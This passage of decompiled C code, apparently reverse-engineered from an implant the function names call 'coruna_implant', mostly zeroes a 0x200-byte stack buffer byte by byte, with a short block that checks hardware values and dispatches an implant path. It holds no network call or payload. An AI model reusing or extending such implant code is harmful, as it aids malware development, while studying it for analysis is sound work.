      stack_guard[0x180] = '\0';
      stack_guard[0x181] = '\0';
      stack_guard[0x182] = '\0';
      stack_guard[0x183] = '\0';
      stack_guard[0x184] = '\0';
      stack_guard[0x185] = '\0';
      stack_guard[0x186] = '\0';
      stack_guard[0x187] = '\0';
      stack_guard[0x198] = '\0';
      stack_guard[0x199] = '\0';
      stack_guard[0x19a] = '\0';
      stack_guard[0x19b] = '\0';
      stack_guard[0x19c] = '\0';
      stack_guard[0x19d] = '\0';
      stack_guard[0x19e] = '\0';
      stack_guard[0x19f] = '\0';
      stack_guard[400] = '\0';
      stack_guard[0x191] = '\0';
      stack_guard[0x192] = '\0';
      stack_guard[0x193] = '\0';
      stack_guard[0x194] = '\0';
      stack_guard[0x195] = '\0';
      stack_guard[0x196] = '\0';
      stack_guard[0x197] = '\0';
      stack_guard[0x168] = '\0';
      stack_guard[0x169] = '\0';
      stack_guard[0x16a] = '\0';
      stack_guard[0x16b] = '\0';
      stack_guard[0x16c] = '\0';
      stack_guard[0x16d] = '\0';
      stack_guard[0x16e] = '\0';
      stack_guard[0x16f] = '\0';
      stack_guard[0x160] = '\0';
      stack_guard[0x161] = '\0';
      stack_guard[0x162] = '\0';
      stack_guard[0x163] = '\0';
      stack_guard[0x164] = '\0';
      stack_guard[0x165] = '\0';
      stack_guard[0x166] = '\0';
      stack_guard[0x167] = '\0';
      stack_guard[0x178] = '\0';
      stack_guard[0x179] = '\0';
      stack_guard[0x17a] = '\0';
      stack_guard[0x17b] = '\0';
      stack_guard[0x17c] = '\0';
      stack_guard[0x17d] = '\0';
      stack_guard[0x17e] = '\0';
      stack_guard[0x17f] = '\0';
      stack_guard[0x170] = '\0';
      stack_guard[0x171] = '\0';
      stack_guard[0x172] = '\0';
      stack_guard[0x173] = '\0';
      stack_guard[0x174] = '\0';
      stack_guard[0x175] = '\0';
      stack_guard[0x176] = '\0';
      stack_guard[0x177] = '\0';
      stack_guard[0x148] = '\0';
      stack_guard[0x149] = '\0';
      stack_guard[0x14a] = '\0';
      stack_guard[0x14b] = '\0';
      stack_guard[0x14c] = '\0';
      stack_guard[0x14d] = '\0';
      stack_guard[0x14e] = '\0';
      stack_guard[0x14f] = '\0';
      stack_guard[0x140] = '\0';
      stack_guard[0x141] = '\0';
      stack_guard[0x142] = '\0';
      stack_guard[0x143] = '\0';
      stack_guard[0x144] = '\0';
      stack_guard[0x145] = '\0';
      stack_guard[0x146] = '\0';
      stack_guard[0x147] = '\0';
      stack_guard[0x158] = '\0';
      stack_guard[0x159] = '\0';
      stack_guard[0x15a] = '\0';
      stack_guard[0x15b] = '\0';
      stack_guard[0x15c] = '\0';
      stack_guard[0x15d] = '\0';
      stack_guard[0x15e] = '\0';
      stack_guard[0x15f] = '\0';
      stack_guard[0x150] = '\0';
      stack_guard[0x151] = '\0';
      stack_guard[0x152] = '\0';
      stack_guard[0x153] = '\0';
      stack_guard[0x154] = '\0';
      stack_guard[0x155] = '\0';
      stack_guard[0x156] = '\0';
      stack_guard[0x157] = '\0';
      stack_guard[0x128] = '\0';
      stack_guard[0x129] = '\0';
      stack_guard[0x12a] = '\0';
      stack_guard[299] = '\0';
      stack_guard[300] = '\0';
      stack_guard[0x12d] = '\0';
      stack_guard[0x12e] = '\0';
      stack_guard[0x12f] = '\0';
      stack_guard[0x120] = '\0';
      stack_guard[0x121] = '\0';
      stack_guard[0x122] = '\0';
      stack_guard[0x123] = '\0';
      stack_guard[0x124] = '\0';
      stack_guard[0x125] = '\0';
      stack_guard[0x126] = '\0';
      stack_guard[0x127] = '\0';
      stack_guard[0x138] = '\0';
      stack_guard[0x139] = '\0';
      stack_guard[0x13a] = '\0';
      stack_guard[0x13b] = '\0';
      stack_guard[0x13c] = '\0';
      stack_guard[0x13d] = '\0';
      stack_guard[0x13e] = '\0';
      stack_guard[0x13f] = '\0';
      stack_guard[0x130] = '\0';
      stack_guard[0x131] = '\0';
      stack_guard[0x132] = '\0';
      stack_guard[0x133] = '\0';
      stack_guard[0x134] = '\0';
      stack_guard[0x135] = '\0';
      stack_guard[0x136] = '\0';
      stack_guard[0x137] = '\0';
      stack_guard[0x108] = '\0';
      stack_guard[0x109] = '\0';
      stack_guard[0x10a] = '\0';
      stack_guard[0x10b] = '\0';
      stack_guard[0x10c] = '\0';
      stack_guard[0x10d] = '\0';
      stack_guard[0x10e] = '\0';
      stack_guard[0x10f] = '\0';
      stack_guard[0x100] = '\0';
      stack_guard[0x101] = '\0';
      stack_guard[0x102] = '\0';
      stack_guard[0x103] = '\0';
      stack_guard[0x104] = '\0';
      stack_guard[0x105] = '\0';
      stack_guard[0x106] = '\0';
      stack_guard[0x107] = '\0';
      stack_guard[0x118] = '\0';
      stack_guard[0x119] = '\0';
      stack_guard[0x11a] = '\0';
      stack_guard[0x11b] = '\0';
      stack_guard[0x11c] = '\0';
      stack_guard[0x11d] = '\0';
      stack_guard[0x11e] = '\0';
      stack_guard[0x11f] = '\0';
      stack_guard[0x110] = '\0';
      stack_guard[0x111] = '\0';
      stack_guard[0x112] = '\0';
      stack_guard[0x113] = '\0';
      stack_guard[0x114] = '\0';
      stack_guard[0x115] = '\0';
      stack_guard[0x116] = '\0';
      stack_guard[0x117] = '\0';
      stack_guard[0xe8] = '\0';
      stack_guard[0xe9] = '\0';
      stack_guard[0xea] = '\0';
      stack_guard[0xeb] = '\0';
      stack_guard[0xec] = '\0';
      stack_guard[0xed] = '\0';
      stack_guard[0xee] = '\0';
      stack_guard[0xef] = '\0';
      stack_guard[0xe0] = '\0';
      stack_guard[0xe1] = '\0';
      stack_guard[0xe2] = '\0';
      stack_guard[0xe3] = '\0';
      stack_guard[0xe4] = '\0';
      stack_guard[0xe5] = '\0';
      stack_guard[0xe6] = '\0';
      stack_guard[0xe7] = '\0';
      stack_guard[0xf8] = '\0';
      stack_guard[0xf9] = '\0';
      stack_guard[0xfa] = '\0';
      stack_guard[0xfb] = '\0';
      stack_guard[0xfc] = '\0';
      stack_guard[0xfd] = '\0';
      stack_guard[0xfe] = '\0';
      stack_guard[0xff] = '\0';
      stack_guard[0xf0] = '\0';
      stack_guard[0xf1] = '\0';
      stack_guard[0xf2] = '\0';
      stack_guard[0xf3] = '\0';
      stack_guard[0xf4] = '\0';
      stack_guard[0xf5] = '\0';
      stack_guard[0xf6] = '\0';
      stack_guard[0xf7] = '\0';
      stack_guard[200] = '\0';
      stack_guard[0xc9] = '\0';
      stack_guard[0xca] = '\0';
      stack_guard[0xcb] = '\0';
      stack_guard[0xcc] = '\0';
      stack_guard[0xcd] = '\0';
      stack_guard[0xce] = '\0';
      stack_guard[0xcf] = '\0';
      stack_guard[0xc0] = '\0';
      stack_guard[0xc1] = '\0';
      stack_guard[0xc2] = '\0';
      stack_guard[0xc3] = '\0';
      stack_guard[0xc4] = '\0';
      stack_guard[0xc5] = '\0';
      stack_guard[0xc6] = '\0';
      stack_guard[199] = '\0';
      stack_guard[0xd8] = '\0';
      stack_guard[0xd9] = '\0';
      stack_guard[0xda] = '\0';
      stack_guard[0xdb] = '\0';
      stack_guard[0xdc] = '\0';
      stack_guard[0xdd] = '\0';
      stack_guard[0xde] = '\0';
      stack_guard[0xdf] = '\0';
      stack_guard[0xd0] = '\0';
      stack_guard[0xd1] = '\0';
      stack_guard[0xd2] = '\0';
      stack_guard[0xd3] = '\0';
      stack_guard[0xd4] = '\0';
      stack_guard[0xd5] = '\0';
      stack_guard[0xd6] = '\0';
      stack_guard[0xd7] = '\0';
      stack_guard[0xa8] = '\0';
      stack_guard[0xa9] = '\0';
      stack_guard[0xaa] = '\0';
      stack_guard[0xab] = '\0';
      stack_guard[0xac] = '\0';
      stack_guard[0xad] = '\0';
      stack_guard[0xae] = '\0';
      stack_guard[0xaf] = '\0';
      stack_guard[0xa0] = '\0';
      stack_guard[0xa1] = '\0';
      stack_guard[0xa2] = '\0';
      stack_guard[0xa3] = '\0';
      stack_guard[0xa4] = '\0';
      stack_guard[0xa5] = '\0';
      stack_guard[0xa6] = '\0';
      stack_guard[0xa7] = '\0';
      stack_guard[0xb8] = '\0';
      stack_guard[0xb9] = '\0';
      stack_guard[0xba] = '\0';
      stack_guard[0xbb] = '\0';
      stack_guard[0xbc] = '\0';
      stack_guard[0xbd] = '\0';
      stack_guard[0xbe] = '\0';
      stack_guard[0xbf] = '\0';
      stack_guard[0xb0] = '\0';
      stack_guard[0xb1] = '\0';
      stack_guard[0xb2] = '\0';
      stack_guard[0xb3] = '\0';
      stack_guard[0xb4] = '\0';
      stack_guard[0xb5] = '\0';
      stack_guard[0xb6] = '\0';
      stack_guard[0xb7] = '\0';
      stack_guard[0x88] = '\0';
      stack_guard[0x89] = '\0';
      stack_guard[0x8a] = '\0';
      stack_guard[0x8b] = '\0';
      stack_guard[0x8c] = '\0';
      stack_guard[0x8d] = '\0';
      stack_guard[0x8e] = '\0';
      stack_guard[0x8f] = '\0';
      stack_guard[0x80] = '\0';
      stack_guard[0x81] = '\0';
      stack_guard[0x82] = '\0';
      stack_guard[0x83] = '\0';
      stack_guard[0x84] = '\0';
      stack_guard[0x85] = '\0';
      stack_guard[0x86] = '\0';
      stack_guard[0x87] = '\0';
      stack_guard[0x98] = '\0';
      stack_guard[0x99] = '\0';
      stack_guard[0x9a] = '\0';
      stack_guard[0x9b] = '\0';
      stack_guard[0x9c] = '\0';
      stack_guard[0x9d] = '\0';
      stack_guard[0x9e] = '\0';
      stack_guard[0x9f] = '\0';
      stack_guard[0x90] = '\0';
      stack_guard[0x91] = '\0';
      stack_guard[0x92] = '\0';
      stack_guard[0x93] = '\0';
      stack_guard[0x94] = '\0';
      stack_guard[0x95] = '\0';
      stack_guard[0x96] = '\0';
      stack_guard[0x97] = '\0';
      stack_guard[0x68] = '\0';
      stack_guard[0x69] = '\0';
      stack_guard[0x6a] = '\0';
      stack_guard[0x6b] = '\0';
      stack_guard[0x6c] = '\0';
      stack_guard[0x6d] = '\0';
      stack_guard[0x6e] = '\0';
      stack_guard[0x6f] = '\0';
      stack_guard[0x60] = '\0';
      stack_guard[0x61] = '\0';
      stack_guard[0x62] = '\0';
      stack_guard[99] = '\0';
      stack_guard[100] = '\0';
      stack_guard[0x65] = '\0';
      stack_guard[0x66] = '\0';
      stack_guard[0x67] = '\0';
      stack_guard[0x78] = '\0';
      stack_guard[0x79] = '\0';
      stack_guard[0x7a] = '\0';
      stack_guard[0x7b] = '\0';
      stack_guard[0x7c] = '\0';
      stack_guard[0x7d] = '\0';
      stack_guard[0x7e] = '\0';
      stack_guard[0x7f] = '\0';
      stack_guard[0x70] = '\0';
      stack_guard[0x71] = '\0';
      stack_guard[0x72] = '\0';
      stack_guard[0x73] = '\0';
      stack_guard[0x74] = '\0';
      stack_guard[0x75] = '\0';
      stack_guard[0x76] = '\0';
      stack_guard[0x77] = '\0';
      stack_guard[0x58] = '\0';
      stack_guard[0x59] = '\0';
      stack_guard[0x5a] = '\0';
      stack_guard[0x5b] = '\0';
      stack_guard[0x5c] = '\0';
      stack_guard[0x5d] = '\0';
      stack_guard[0x5e] = '\0';
      stack_guard[0x5f] = '\0';
      stack_guard[0x50] = '\0';
      stack_guard[0x51] = '\0';
      stack_guard[0x52] = '\0';
      stack_guard[0x53] = '\0';
      stack_guard[0x54] = '\0';
      stack_guard[0x55] = '\0';
      stack_guard[0x56] = '\0';
      stack_guard[0x57] = '\0';
      stack_guard[0x38] = '\0';
      stack_guard[0x39] = '\0';
      stack_guard[0x3a] = '\0';
      stack_guard[0x3b] = '\0';
      stack_guard[0x3c] = '\0';
      stack_guard[0x3d] = '\0';
      stack_guard[0x3e] = '\0';
      stack_guard[0x3f] = '\0';
      stack_guard[0x30] = '\0';
      stack_guard[0x31] = '\0';
      stack_guard[0x32] = '\0';
      stack_guard[0x33] = '\0';
      stack_guard[0x34] = '\0';
      stack_guard[0x35] = '\0';
      stack_guard[0x36] = '\0';
      stack_guard[0x37] = '\0';
      stack_guard[0x48] = '\0';
      stack_guard[0x49] = '\0';
      stack_guard[0x4a] = '\0';
      stack_guard[0x4b] = '\0';
      stack_guard[0x4c] = '\0';
      stack_guard[0x4d] = '\0';
      stack_guard[0x4e] = '\0';
      stack_guard[0x4f] = '\0';
      stack_guard[0x40] = '\0';
      stack_guard[0x41] = '\0';
      stack_guard[0x42] = '\0';
      stack_guard[0x43] = '\0';
      stack_guard[0x44] = '\0';
      stack_guard[0x45] = '\0';
      stack_guard[0x46] = '\0';
      stack_guard[0x47] = '\0';
      stack_guard[0x18] = '\0';
      stack_guard[0x19] = '\0';
      stack_guard[0x1a] = '\0';
      stack_guard[0x1b] = '\0';
      stack_guard[0x1c] = '\0';
      stack_guard[0x1d] = '\0';
      stack_guard[0x1e] = '\0';
      stack_guard[0x1f] = '\0';
      stack_guard[0x10] = '\0';
      stack_guard[0x11] = '\0';
      stack_guard[0x12] = '\0';
      stack_guard[0x13] = '\0';
      stack_guard[0x14] = '\0';
      stack_guard[0x15] = '\0';
      stack_guard[0x16] = '\0';
      stack_guard[0x17] = '\0';
      stack_guard[0x28] = '\0';
      stack_guard[0x29] = '\0';
      stack_guard[0x2a] = '\0';
      stack_guard[0x2b] = '\0';
      stack_guard[0x2c] = '\0';
      stack_guard[0x2d] = '\0';
      stack_guard[0x2e] = '\0';
      stack_guard[0x2f] = '\0';
      stack_guard[0x20] = '\0';
      stack_guard[0x21] = '\0';
      stack_guard[0x22] = '\0';
      stack_guard[0x23] = '\0';
      stack_guard[0x24] = '\0';
      stack_guard[0x25] = '\0';
      stack_guard[0x26] = '\0';
      stack_guard[0x27] = '\0';
      stack_guard[8] = '\0';
      stack_guard[9] = '\0';
      stack_guard[10] = '\0';
      stack_guard[0xb] = '\0';
      stack_guard[0xc] = '\0';
      stack_guard[0xd] = '\0';
      stack_guard[0xe] = '\0';
      stack_guard[0xf] = '\0';
      stack_guard[0] = '\0';
      stack_guard[1] = '\0';
      stack_guard[2] = '\0';
      stack_guard[3] = '\0';
      stack_guard[4] = '\0';
      stack_guard[5] = '\0';
      stack_guard[6] = '\0';
      stack_guard[7] = '\0';
      block_ctx = 0;
      port = coruna_implant6850_str_hw_model(arg);
      if ((port & 1) == 0) {
        if (*(int *)(arg + 0xc0) - 0x100400U >> 10 < 0x3f) {
          err = *(int *)(arg + 0xe0);
          if (err < 0x1b588bb3) {
            if (err != -0x789a1216) {
              flags = -0x25cc27c3;
done:
              if (err != flags) goto cleanup;
            }
          }
          else if (err != 0x462504d2) {
            flags = 0x1b588bb3;
            goto done;
          }
          err = *(char *)(arg + 0x5e9);
          size = 0x40000;
          version = 0x30000;
        }
        else {
cleanup:
          if (0x400 < *(int *)(arg + 0xc0) - 0x100000U) goto check_ok;
          err = *(char *)(arg + 0x5e9);
          size = 0x60000;
          version = 0x50000;
        }
        if (err != '\0') {
          version = size;
        }
        size = 0xa3000000;
        if (*(uint *)(arg + 0xdc) < 2) {
          size = 0xa2000000;
        }
      }
      else {
check_ok:
        version = 0;
        size = 0;
      }
      port = coruna_snprintf(arg,size | version,handle,status,stack_guard,0x200,&block_ctx);
      if ((int)port != 0) goto fail;
      action = (void *)0x0;
      host_info = host_info & 0xffffffff00000000;
      port = coruna_implant_path_dispatch(arg,stack_guard,*(uint32_t *)(handle + 4),block_ctx,&action,
                            &host_info);
      if ((int)port != 0) goto fail;
      stack_guard[0x1e8] = '\0';
      stack_guard[0x1e9] = '\0';
      stack_guard[0x1ea] = '\0';
      stack_guard[0x1eb] = '\0';
      stack_guard[0x1ec] = '\0';
      stack_guard[0x1ed] = '\0';
      stack_guard[0x1ee] = '\0';
      stack_guard[0x1ef] = '\0';
      stack_guard[0x1e0] = '\0';
      stack_guard[0x1e1] = '\0';
      stack_guard[0x1e2] = '\0';
      stack_guard[0x1e3] = '\0';
      stack_guard[0x1e4] = '\0';
      stack_guard[0x1e5] = '\0';
      stack_guard[0x1e6] = '\0';
      stack_guard[0x1e7] = '\0';
      stack_guard[0x1f8] = '\0';
      stack_guard[0x1f9] = '\0';
      stack_guard[0x1fa] = '\0';
      stack_guard[0x1fb] = '\0';
      stack_guard[0x1fc] = '\0';
      stack_guard[0x1fd] = '\0';
      stack_guard[0x1fe] = '\0';
      stack_guard[0x1ff] = '\0';
      stack_guard[0x1f0] = '\0';
      stack_guard[0x1f1] = '\0';
      stack_guard[0x1f2] = '\0';
      stack_guard[499] = '\0';
      stack_guard[500] = '\0';
      stack_guard[0x1f5] = '\0';
      stack_guard[0x1f6] = '\0';
      stack_guard[0x1f7] = '\0';
      stack_guard[0x1c8] = '\0';
      stack_guard[0x1c9] = '\0';
      stack_guard[0x1ca] = '\0';
      stack_guard[0x1cb] = '\0';
      stack_guard[0x1cc] = '\0';
      stack_guard[0x1cd] = '\0';
      stack_guard[0x1ce] = '\0';
      stack_guard[0x1cf] = '\0';
      stack_guard[0x1c0] = '\0';
      stack_guard[0x1c1] = '\0';
      stack_guard[0x1c2] = '\0';
      stack_guard[0x1c3] = '\0';
      stack_guard[0x1c4] = '\0';
      stack_guard[0x1c5] = '\0';
      stack_guard[0x1c6] = '\0';
      stack_guard[0x1c7] = '\0';
      stack_guard[0x1d8] = '\0';
      stack_guard[0x1d9] = '\0';
      stack_guard[0x1da] = '\0';
      stack_guard[0x1db] = '\0';
      stack_guard[0x1dc] = '\0';
      stack_guard[0x1dd] = '\0';
      stack_guard[0x1de] = '\0';
      stack_guard[0x1df] = '\0';
      stack_guard[0x1d0] = '\0';
      stack_guard[0x1d1] = '\0';
      stack_guard[0x1d2] = '\0';
      stack_guard[0x1d3] = '\0';
      stack_guard[0x1d4] = '\0';
      stack_guard[0x1d5] = '\0';
      stack_guard[0x1d6] = '\0';
      stack_guard[0x1d7] = '\0';
      stack_guard[0x1a8] = '\0';
      stack_guard[0x1a9] = '\0';
      stack_guard[0x1aa] = '\0';
      stack_guard[0x1ab] = '\0';
      stack_guard[0x1ac] = '\0';
      stack_guard[0x1ad] = '\0';
      stack_guard[0x1ae] = '\0';
      stack_guard[0x1af] = '\0';
      stack_guard[0x1a0] = '\0';
      stack_guard[0x1a1] = '\0';
      stack_guard[0x1a2] = '\0';
      stack_guard[0x1a3] = '\0';
      stack_guard[0x1a4] = '\0';
      stack_guard[0x1a5] = '\0';
      stack_guard[0x1a6] = '\0';
      stack_guard[0x1a7] = '\0';
      stack_guard[0x1b8] = '\0';
      stack_guard[0x1b9] = '\0';
      stack_guard[0x1ba] = '\0';
      stack_guard[0x1bb] = '\0';
      stack_guard[0x1bc] = '\0';
      stack_guard[0x1bd] = '\0';
      stack_guard[0x1be] = '\0';
      stack_guard[0x1bf] = '\0';
      stack_guard[0x1b0] = '\0';
      stack_guard[0x1b1] = '\0';
      stack_guard[0x1b2] = '\0';
      stack_guard[0x1b3] = '\0';
      stack_guard[0x1b4] = '\0';
      stack_guard[0x1b5] = '\0';
      stack_guard[0x1b6] = '\0';
      stack_guard[0x1b7] = '\0';
      stack_guard[0x188] = '\0';
      stack_guard[0x189] = '\0';
      stack_guard[0x18a] = '\0';
      stack_guard[0x18b] = '\0';
      stack_guard[0x18c] = '\0';
      stack_guard[0x18d] = '\0';
      stack_guard[0x18e] = '\0';
      stack_guard[399] = '\0';
      stack_guard[0x180] = '\0';
      stack_guard[0x181] = '\0';
      stack_guard[0x182] = '\0';
      stack_guard[0x183] = '\0';
      stack_guard[0x184] = '\0';
      stack_guard[0x185] = '\0';
      stack_guard[0x186] = '\0';
      stack_guard[0x187] = '\0';
      stack_guard[0x198] = '\0';
      stack_guard[0x199] = '\0';
      stack_guard[0x19a] = '\0';
      stack_guard[0x19b] = '\0';
      stack_guard[0x19c] = '\0';
      stack_guard[0x19d] = '\0';
      stack_guard[0x19e] = '\0';
      stack_guard[0x19f] = '\0';
      stack_guard[400] = '\0';
      stack_guard[0x191] = '\0';
      stack_guard[0x192] = '\0';
      stack_guard[0x193] = '\0';
      stack_guard[0x194] = '\0';
      stack_guard[0x195] = '\0';
      stack_guard[0x196] = '\0';
      stack_guard[0x197] = '\0';
      stack_guard[0x168] = '\0';
      stack_guard[0x169] = '\0';
      stack_guard[0x16a] = '\0';
      stack_guard[0x16b] = '\0';
      stack_guard[0x16c] = '\0';
      stack_guard[0x16d] = '\0';
      stack_guard[0x16e] = '\0';
      stack_guard[0x16f] = '\0';
      stack_guard[0x160] = '\0';
      stack_guard[0x161] = '\0';
      stack_guard[0x162] = '\0';
      stack_guard[0x163] = '\0';
      stack_guard[0x164] = '\0';
      stack_guard[0x165] = '\0';
      stack_guard[0x166] = '\0';
      stack_guard[0x167] = '\0';
      stack_guard[0x178] = '\0';
      stack_guard[0x179] = '\0';
      stack_guard[0x17a] = '\0';
      stack_guard[0x17b] = '\0';
      stack_guard[0x17c] = '\0';
      stack_guard[0x17d] = '\0';
      stack_guard[0x17e] = '\0';
      stack_guard[0x17f] = '\0';
      stack_guard[0x170] = '\0';
      stack_guard[0x171] = '\0';
      stack_guard[0x172] = '\0';
      stack_guard[0x173] = '\0';
      stack_guard[0x174] = '\0';
      stack_guard[0x175] = '\0';
      stack_guard[0x176] = '\0';
      stack_guard[0x177] = '\0';
      stack_guard[0x148] = '\0';
      stack_guard[0x149] = '\0';
      stack_guard[0x14a] = '\0';
      stack_guard[0x14b] = '\0';
      stack_guard[0x14c] = '\0';
      stack_guard[0x14d] = '\0';
      stack_guard[0x14e] = '\0';
      stack_guard[0x14f] = '\0';
      stack_guard[0x140] = '\0';
      stack_guard[0x141] = '\0';
      stack_guard[0x142] = '\0';
      stack_guard[0x143] = '\0';
      stack_guard[0x144] = '\0';
      stack_guard[0x145] = '\0';
      stack_guard[0x146] = '\0';
      stack_guard[0x147] = '\0';
      stack_guard[0x158] = '\0';
      stack_guard[0x159] = '\0';
      stack_guard[0x15a] = '\0';
      stack_guard[0x15b] = '\0';
      stack_guard[0x15c] = '\0';
      stack_guard[0x15d] = '\0';
      stack_guard[0x15e] = '\0';
      stack_guard[0x15f] = '\0';
      stack_guard[0x150] = '\0';
      stack_guard[0x151] = '\0';
      stack_guard[0x152] = '\0';
      stack_guard[0x153] = '\0';
      stack_guard[0x154] = '\0';
      stack_guard[0x155] = '\0';
      stack_guard[0x156] = '\0';
      stack_guard[0x157] = '\0';
      stack_guard[0x128] = '\0';
      stack_guard[0x129] = '\0';
      stack_guard[0x12a] = '\0';
      stack_guard[299] = '\0';
      stack_guard[300] = '\0';
      stack_guard[0x12d] = '\0';
      stack_guard[0x12e] = '\0';
      stack_guard[0x12f] = '\0';
      stack_guard[0x120] = '\0';
      stack_guard[0x121] = '\0';
      stack_guard[0x122] = '\0';
      stack_guard[0x123] = '\0';
      stack_guard[0x124] = '\0';
      stack_guard[0x125] = '\0';
      stack_guard[0x126] = '\0';
      stack_guard[0x127] = '\0';
      stack_guard[0x138] = '\0';
      stack_guard[0x139] = '\0';
      stack_guard[0x13a] = '\0';
      stack_guard[0x13b] = '\0';
      stack_guard[0x13c] = '\0';
      stack_guard[0x13d] = '\0';
      stack_guard[0x13e] = '\0';
      stack_guard[0x13f] = '\0';
      stack_guard[0x130] = '\0';
      stack_guard[0x131] = '\0';
      stack_guard[0x132] = '\0';
      stack_guard[0x133] = '\0';
      stack_guard[0x134] = '\0';
      stack_guard[0x135] = '\0';
      stack_guard[0x136] = '\0';
      stack_guard[0x137] = '\0';
      stack_guard[0x108] = '\0';
      stack_guard[0x109] = '\0';
      stack_guard[0x10a] = '\0';
      stack_guard[0x10b] = '\0';
      stack_guard[0x10c] = '\0';
      stack_guard[0x10d] = '\0';
      stack_guard[0x10e] = '\0';
      stack_guard[0x10f] = '\0';
      stack_guard[0x100] = '\0';
      stack_guard[0x101] = '\0';
      stack_guard[0x102] = '\0';
      stack_guard[0x103] = '\0';
      stack_guard[0x104] = '\0';
      stack_guard[0x105] = '\0';
      stack_guard[0x106] = '\0';
      stack_guard[0x107] = '\0';
      stack_guard[0x118] = '\0';
      stack_guard[0x119] = '\0';
      stack_guard[0x11a] = '\0';
      stack_guard[0x11b] = '\0';
      stack_guard[0x11c] = '\0';
      stack_guard[0x11d] = '\0';
      stack_guard[0x11e] = '\0';
      stack_guard[0x11f] = '\0';
      stack_guard[0x110] = '\0';
      stack_guard[0x111] = '\0';
      stack_guard[0x112] = '\0';
      stack_guard[0x113] = '\0';
      stack_guard[0x114] = '\0';
      stack_guard[0x115] = '\0';
      stack_guard[0x116] = '\0';
      stack_guard[0x117] = '\0';
      stack_guard[0xe8] = '\0';
      stack_guard[0xe9] = '\0';
      stack_guard[0xea] = '\0';
      stack_guard[0xeb] = '\0';
      stack_guard[0xec] = '\0';
      stack_guard[0xed] = '\0';
      stack_guard[0xee] = '\0';
      stack_guard[0xef] = '\0';
      stack_guard[0xe0] = '\0';
      stack_guard[0xe1] = '\0';
      stack_guard[0xe2] = '\0';
      stack_guard[0xe3] = '\0';
      stack_guard[0xe4] = '\0';
      stack_guard[0xe5] = '\0';
      stack_guard[0xe6] = '\0';
      stack_guard[0xe7] = '\0';
      stack_guard[0xf8] = '\0';
      stack_guard[0xf9] = '\0';
      stack_guard[0xfa] = '\0';
      stack_guard[0xfb] = '\0';
      stack_guard[0xfc] = '\0';
      stack_guard[0xfd] = '\0';
      stack_guard[0xfe] = '\0';
      stack_guard[0xff] = '\0';
      stack_guard[0xf0] = '\0';
      stack_guard[0xf1] = '\0';
      stack_guard[0xf2] = '\0';
      stack_guard[0xf3] = '\0';
      stack_guard[0xf4] = '\0';
      stack_guard[0xf5] = '\0';
      stack_guard[0xf6] = '\0';
      stack_guard[0xf7] = '\0';
      stack_guard[200] = '\0';
      stack_guard[0xc9] = '\0';
      stack_guard[0xca] = '\0';
      stack_guard[0xcb] = '\0';
      stack_guard[0xcc] = '\0';
      stack_guard[0xcd] = '\0';
      stack_guard[0xce] = '\0';
      stack_guard[0xcf] = '\0';
      stack_guard[0xc0] = '\0';
      stack_guard[0xc1] = '\0';
      stack_guard[0xc2] = '\0';
      stack_guard[0xc3] = '\0';
      stack_guard[0xc4] = '\0';
      stack_guard[0xc5] = '\0';
      stack_guard[0xc6] = '\0';
      stack_guard[199] = '\0';
      stack_guard[0xd8] = '\0';
      stack_guard[0xd9] = '\0';
      stack_guard[0xda] = '\0';
      stack_guard[0xdb] = '\0';
      stack_guard[0xdc] = '\0';
      stack_guard[0xdd] = '\0';
      stack_guard[0xde] = '\0';
      stack_guard[0xdf] = '\0';
      stack_guard[0xd0] = '\0';
      stack_guard[0xd1] = '\0';
      stack_guard[0xd2] = '\0';
      stack_guard[0xd3] = '\0';
      stack_guard[0xd4] = '\0';
      stack_guard[0xd5] = '\0';
      stack_guard[0xd6] = '\0';
      stack_guard[0xd7] = '\0';
      stack_guard[0xa8] = '\0';
      stack_guard[0xa9] = '\0';
      stack_guard[0xaa] = '\0';
      stack_guard[0xab] = '\0';
      stack_guard[0xac] = '\0';
      stack_guard[0xad] = '\0';
      stack_guard[0xae] = '\0';
      stack_guard[0xaf] = '\0';
      stack_guard[0xa0] = '\0';
      stack_guard[0xa1] = '\0';
      stack_guard[0xa2] = '\0';
      stack_guard[0xa3] = '\0';
      stack_guard[0xa4] = '\0';
      stack_guard[0xa5] = '\0';
      stack_guard[0xa6] = '\0';
      stack_guard[0xa7] = '\0';
      stack_guard[0xb8] = '\0';
      stack_guard[0xb9] = '\0';
      stack_guard[0xba] = '\0';
      stack_guard[0xbb] = '\0';
      stack_guard[0xbc] = '\0';
      stack_guard[0xbd] = '\0';
      stack_guard[0xbe] = '\0';
      stack_guard[0xbf] = '\0';
      stack_guard[0xb0] = '\0';
      stack_guard[0xb1] = '\0';
      stack_guard[0xb2] = '\0';
      stack_guard[0xb3] = '\0';
      stack_guard[0xb4] = '\0';
      stack_guard[0xb5] = '\0';
      stack_guard[0xb6] = '\0';
      stack_guard[0xb7] = '\0';
      stack_guard[0x88] = '\0';
      stack_guard[0x89] = '\0';
      stack_guard[0x8a] = '\0';
      stack_guard[0x8b] = '\0';
      stack_guard[0x8c] = '\0';
      stack_guard[0x8d] = '\0';
      stack_guard[0x8e] = '\0';
      stack_guard[0x8f] = '\0';
      stack_guard[0x80] = '\0';
      stack_guard[0x81] = '\0';
      stack_guard[0x82] = '\0';
      stack_guard[0x83] = '\0';
      stack_guard[0x84] = '\0';
      stack_guard[0x85] = '\0';
      stack_guard[0x86] = '\0';
      stack_guard[0x87] = '\0';
      stack_guard[0x98] = '\0';
      stack_guard[0x99] = '\0';
      stack_guard[0x9a] = '\0';
      stack_guard[0x9b] = '\0';
      stack_guard[0x9c] = '\0';
      stack_guard[0x9d] = '\0';
      stack_guard[0x9e] = '\0';
      stack_guard[0x9f] = '\0';
      stack_guard[0x90] = '\0';
      stack_guard[0x91] = '\0';
      stack_guard[0x92] = '\0';
      stack_guard[0x93] = '\0';
      stack_guard[0x94] = '\0';
      stack_guard[0x95] = '\0';
      stack_guard[0x96] = '\0';
      stack_guard[0x97] = '\0';
      stack_guard[0x68] = '\0';
      stack_guard[0x69] = '\0';
      stack_guard[0x6a] = '\0';
      stack_guard[0x6b] = '\0';
      stack_guard[0x6c] = '\0';
      stack_guard[0x6d] = '\0';
      stack_guard[0x6e] = '\0';
      stack_guard[0x6f] = '\0';
      stack_guard[0x60] = '\0';
      stack_guard[0x61] = '\0';
      stack_guard[0x62] = '\0';
      stack_guard[99] = '\0';
      stack_guard[100] = '\0';
      stack_guard[0x65] = '\0';
      stack_guard[0x66] = '\0';
      stack_guard[0x67] = '\0';
      stack_guard[0x78] = '\0';
      stack_guard[0x79] = '\0';
      stack_guard[0x7a] = '\0';
      stack_guard[0x7b] = '\0';
      stack_guard[0x7c] = '\0';
      stack_guard[0x7d] = '\0';
      stack_guard[0x7e] = '\0';
      stack_guard[0x7f] = '\0';
      stack_guard[0x70] = '\0';
